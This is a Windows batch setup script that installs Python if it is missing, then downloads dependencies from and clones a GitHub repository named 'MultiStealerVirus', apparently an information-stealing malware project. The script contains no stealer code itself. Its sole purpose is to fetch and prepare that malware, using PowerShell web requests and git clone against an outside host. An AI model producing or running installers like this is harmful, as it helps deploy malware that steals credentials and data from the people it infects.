@echo off


python --version
if %errorlevel% neq 0 (
  echo Installing Python...
  powershell.exe -Command "& {Invoke-WebRequest -Uri https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe -OutFile python-3.10.0-amd64.exe}"
  python-3.10.0-amd64.exe /quiet InstallAllUsers=1 PrependPath=1
  echo Python installed...
  pause
)

echo Installing dependencies...
powershell.exe -Command "& {Invoke-WebRequest -Uri https://raw.githubusercontent.com/Josakko/MultiStealerVirus/main/requirements.txt -OutFile requirements.txt}"
pip install -r requirements.txt

echo Installation complete!
pause

where git > nul
if %errorlevel% neq 0 (
  echo Git is not installed. Please install Git or clone the repository manually!
  pause
  exit
)

echo Cloning repository...
git clone https://github.com/Josakko/MultiStealerVirus.git
echo Setup complete!
pause
